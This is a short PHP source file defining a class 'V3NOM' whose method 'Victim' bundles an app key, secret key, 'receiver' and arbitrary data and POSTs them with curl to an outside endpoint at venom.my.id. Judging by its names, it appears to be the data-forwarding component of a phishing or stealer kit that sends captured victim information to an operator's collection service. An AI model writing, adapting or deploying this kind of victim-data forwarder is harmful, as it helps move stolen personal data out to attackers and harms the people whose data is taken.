<?php

class V3NOM
{
    // mode = live/sandbox
    public static function Victim($params)
    {
        $arrdata = $params['data'];
        $datafinal = array(
            'app_key' => $params['app_key'],
            'secret_key' => $params['secret_key'],
            'receiver' => $params['receiver'],
            'data' => $arrdata
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://venom.my.id/api/v1/live");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt(
            $ch,
            CURLOPT_POSTFIELDS,
            http_build_query($datafinal)
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        $server_output = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);
        if ($err) {
            return json_encode(
                array(
                    'status' => false,
                    'message' => $err
                ),
                JSON_PRETTY_PRINT
            );
        } else {

            return json_encode(array(
                'status' => true,
                'data' => $server_output
            ), JSON_PRETTY_PRINT);
        }
    }
}
